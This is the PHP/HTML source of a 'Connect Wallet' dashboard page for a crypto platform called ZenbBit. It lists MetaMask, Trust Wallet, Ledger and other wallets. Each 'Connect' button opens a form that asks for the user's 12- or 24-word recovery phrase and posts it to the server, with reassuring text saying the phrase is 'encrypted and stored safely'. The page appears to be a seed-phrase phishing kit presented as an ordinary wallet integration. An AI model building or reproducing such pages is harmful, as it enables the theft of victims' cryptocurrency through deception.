<?php 
include 'includes/dashboard_init.php';
$pageTitle = 'Connect Wallet'; 
$includeIziToast = true; 

// Generate wallet connection token for API authentication
if (!isset($_SESSION['wallet_token'])) {
    $_SESSION['wallet_token'] = bin2hex(random_bytes(32));
}
$walletToken = $_SESSION['wallet_token'];

include 'includes/head.php'; 
?>
<body class="light-mode dashboard-body" data-page="connect">

  <!-- Sidebar Component -->
  <?php include 'includes/sidebar.php'; ?>

  <!-- Top Navbar Component -->
  <?php include 'includes/header.php'; ?>

  <!-- Wallets Section -->
  <main style="padding-bottom: 6rem;">
    <section class="connect-section" style="margin-top: 6rem; margin-bottom: 8rem;">
      <div class="container">
        <!-- Header -->
        <div class="section-header">
          <h1 class="section-title">Connect Your Wallet</h1>
          <p class="section-subtitle">
            Securely connect your cryptocurrency wallet to ZenbBit. Your wallet phrase is encrypted and stored safely.
          </p>
        </div>

        <!-- Wallet Grid -->
        <div class="wallet-grid">
          <!-- MetaMask -->
          <div class="wallet-card" data-wallet="metamask" data-wallet-name="MetaMask">
            <div class="wallet-card-inner">
              <svg class="wallet-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <path d="M90 10H10C7.8 10 6 11.8 6 14v72c0 2.2 1.8 4 4 4h80c2.2 0 4-1.8 4-4V14c0-2.2-1.8-4-4-4z" fill="#f0b232"/>
                <path d="M50 40L65 30l5 15H30l5-15L50 40z" fill="#fff"/>
                <path d="M45 60L30 50v15l15 10V60zm10 0l15-10v15l-15 10V60z" fill="#fff"/>
              </svg>
              <h3>MetaMask</h3>
              <p class="wallet-description">Most popular Ethereum wallet</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('MetaMask')">Connect</button>
            </div>
          </div>
          <!-- Trust Wallet -->
          <div class="wallet-card" data-wallet="trust" data-wallet-name="Trust Wallet">
            <div class="wallet-card-inner">
              <svg class="wallet-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <rect x="10" y="10" width="80" height="80" fill="#3375BB" rx="8"/>
                <path d="M50 25L70 40v30c0 15-20 20-20 20s-20-5-20-20V40l20-15z" fill="#fff"/>
              </svg>
              <h3>Trust Wallet</h3>
              <p class="wallet-description">Multi-chain wallet for iOS & Android</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Trust Wallet')">Connect</button>
            </div>
          </div>
          <!-- Coinbase Wallet -->
          <div class="wallet-card" data-wallet="coinbase" data-wallet-name="Coinbase Wallet">
            <div class="wallet-card-inner">
              <svg class="wallet-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <rect width="100" height="100" fill="#1652f0" rx="10"/>
                <path d="M30 40h40v20H30V40zm0 30h40v-5H30v5z" fill="#fff"/>
              </svg>
              <h3>Coinbase Wallet</h3>
              <p class="wallet-description">Self-custodial wallet by Coinbase</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Coinbase Wallet')">Connect</button>
            </div>
          </div>
          <!-- Phantom (Solana) -->
          <div class="wallet-card" data-wallet="phantom" data-wallet-name="Phantom">
            <div class="wallet-card-inner">
              <svg class="wallet-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="45" fill="#ab9ff2"/>
                <path d="M50 30c-11 0-20 9-20 20s9 20 20 20 20-9 20-20-9-20-20-20z" fill="#fff"/>
              </svg>
              <h3>Phantom</h3>
              <p class="wallet-description">Solana wallet & portal</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Phantom')">Connect</button>
            </div>
          </div>
          <!-- Ledger -->
          <div class="wallet-card" data-wallet="ledger" data-wallet-name="Ledger">
            <div class="wallet-card-inner">
              <svg class="wallet-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <rect x="15" y="20" width="70" height="60" fill="#000" stroke="#fff" stroke-width="2" rx="4"/>
                <circle cx="35" cy="50" r="6" fill="#fff"/>
                <circle cx="50" cy="50" r="6" fill="#fff"/>
                <circle cx="65" cy="50" r="6" fill="#fff"/>
              </svg>
              <h3>Ledger Live</h3>
              <p class="wallet-description">Hardware wallet management</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Ledger')">Connect</button>
            </div>
          </div>
          <!-- OKX Wallet -->
          <div class="wallet-card" data-wallet="okx" data-wallet-name="OKX Wallet">
            <div class="wallet-card-inner">
              <svg class="wallet-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <rect width="100" height="100" fill="#000"/>
                <text x="50" y="60" font-size="48" font-weight="bold" fill="#fff" text-anchor="middle">OKX</text>
              </svg>
              <h3>OKX Wallet</h3>
              <p class="wallet-description">Multi-chain crypto wallet</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('OKX Wallet')">Connect</button>
            </div>
          </div>
          <!-- Trezor -->
          <div class="wallet-card" data-wallet="trezor" data-wallet-name="Trezor">
            <div class="wallet-card-inner">
              <svg class="wallet-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <rect width="100" height="100" fill="#08335E" rx="10"/>
                <path d="M25 35h50v30H25V35z" fill="#1abc9c" stroke="#fff" stroke-width="2"/>
              </svg>
              <h3>Trezor</h3>
              <p class="wallet-description">Hardware wallet security</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Trezor')">Connect</button>
            </div>
          </div>
          <!-- Exodus -->
          <div class="wallet-card" data-wallet="exodus" data-wallet-name="Exodus">
            <div class="wallet-card-inner">
              <svg class="wallet-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <defs>
                  <linearGradient id="exoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                    <stop offset="0%" style="stop-color:#ff6b35;stop-opacity:1" />
                    <stop offset="100%" style="stop-color:#ff0000;stop-opacity:1" />
                  </linearGradient>
                </defs>
                <rect width="100" height="100" fill="url(#exoGrad)" rx="10"/>
                <path d="M50 30L65 50L50 70L35 50Z" fill="#fff"/>
              </svg>
              <h3>Exodus</h3>
              <p class="wallet-description">Desktop & mobile wallet</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Exodus')">Connect</button>
            </div>
          </div>
          <!-- Argent -->
          <div class="wallet-card" data-wallet="argent" data-wallet-name="Argent">
            <div class="wallet-card-inner">
              <svg class="wallet-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="45" fill="#ec5242"/>
                <path d="M50 25L70 55H30L50 25z" fill="#fff" transform="translate(0, 5)"/>
              </svg>
              <h3>Argent</h3>
              <p class="wallet-description">Secure Ethereum wallet</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('Argent')">Connect</button>
            </div>
          </div>
          <!-- MyEtherWallet -->
          <div class="wallet-card" data-wallet="mew" data-wallet-name="MyEtherWallet">
            <div class="wallet-card-inner">
              <svg class="wallet-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                <rect width="100" height="100" fill="#2c5aa0"/>
                <path d="M50 20L80 45V75L50 85L20 75V45L50 20z" fill="#63B175" opacity="0.8"/>
              </svg>
              <h3>MyEtherWallet</h3>
              <p class="wallet-description">Client-side wallet manager</p>
              <button class="wallet-btn" type="button" onclick="openWalletModal('MyEtherWallet')">Connect</button>
            </div>
          </div>
        </div>
      </div>
    </section>
  </main>

  <!-- Wallet Connect Modal -->
  <div id="walletModal" class="wallet-modal-overlay">
    <div class="wallet-modal-container">
      <div class="wallet-modal-header">
        <h2 id="modalTitle">Connect Wallet</h2>
        <button class="wallet-modal-close" type="button" onclick="closeWalletModal()">&times;</button>
      </div>

      <div class="wallet-modal-content">
        <div id="formError" class="wallet-form-alert wallet-alert-error" style="display: none;"></div>
        <div id="formSuccess" class="wallet-form-alert wallet-alert-success" style="display: none;"></div>

        <form id="connectForm" method="POST" onsubmit="handleWalletConnect(event)">
          <input type="hidden" name="c_wallet" value="1">
          <input type="hidden" name="wallet_name" id="walletName">
          <input type="hidden" name="wallet_token" value="<?php echo htmlspecialchars($walletToken); ?>">

          <div class="wallet-form-group">
            <label for="mnemonic" class="wallet-form-label">Enter Recovery Phrase</label>
            <p class="wallet-form-hint">Enter your 12 or 24 word seed phrase. Words should be separated by spaces.</p>
            <textarea 
              id="mnemonic" 
              name="mnemonic" 
              class="wallet-form-input wallet-form-textarea"
              placeholder="word1 word2 word3 ... word12"
              rows="6"
              required
            ></textarea>
            <div class="wallet-word-counter">
              <span>Words: <strong id="wordCount">0</strong></span>
              <span id="wordStatus" class="wallet-word-status"></span>
            </div>
          </div>

          <div class="wallet-modal-actions">
            <button type="button" class="wallet-btn-secondary" onclick="closeWalletModal()">Cancel</button>
            <button type="submit" class="wallet-btn-primary" id="submitBtn">
              <span>Connect Wallet</span>
              <span class="wallet-btn-loader" style="display: none;">
                <span class="wallet-spinner"></span>
              </span>
            </button>
          </div>
        </form>
      </div>
    </div>
  </div>

  <!-- Success Modal -->
  <div id="successModal" class="wallet-modal-overlay">
    <div class="wallet-modal-container wallet-success-modal">
      <div class="wallet-modal-content">
        <div class="wallet-success-icon">
          <svg width="80" height="80" viewBox="0 0 80 80" fill="none">
            <circle cx="40" cy="40" r="38" stroke="#FF9800" stroke-width="2" fill="#FF9800" opacity="0.1"/>
            <circle cx="40" cy="30" r="4" fill="#FF9800"/>
            <path d="M40 38V55" stroke="#FF9800" stroke-width="2" stroke-linecap="round"/>
          </svg>
        </div>
        <h3 id="successTitle" style="margin: 20px 0 10px 0;">Status Update</h3>
        <p id="successMessage" style="color: #666; margin-bottom: 20px;">
          Wallet connection failed
        </p>
        <button class="wallet-btn-primary" type="button" onclick="closeSuccessModal()">Continue</button>
      </div>
    </div>
  </div>

  <!-- Footer Component -->
  <?php include 'includes/footer.php'; ?>

  <!-- External Scripts -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

  <!-- Dashboard Scripts -->
  <script src="js/script.js"></script>
  
  <!-- Wallet Modal Handler -->
  <script src="js/wallet-modal.js"></script>

  <!-- Global function exposures for inline form handlers -->
  <script>
    // Expose global functions to avoid "not defined" errors in inline onclick handlers
    window.openWalletModal = function(walletName) {
      if (typeof window.WalletModalHandler !== 'undefined' && window.WalletModalHandler.openWalletModal) {
        window.WalletModalHandler.openWalletModal(walletName);
      }
    };
    window.closeWalletModal = function() {
      if (typeof window.WalletModalHandler !== 'undefined' && window.WalletModalHandler.closeWalletModal) {
        window.WalletModalHandler.closeWalletModal();
      }
    };
    window.closeSuccessModal = function() {
      if (typeof window.WalletModalHandler !== 'undefined' && window.WalletModalHandler.closeSuccessModal) {
        window.WalletModalHandler.closeSuccessModal();
      }
    };
    window.handleWalletConnect = function(event) {
      if (typeof window.WalletModalHandler !== 'undefined' && window.WalletModalHandler.handleWalletConnect) {
        window.WalletModalHandler.handleWalletConnect(event);
      }
    };
  </script>

</body>
</html>
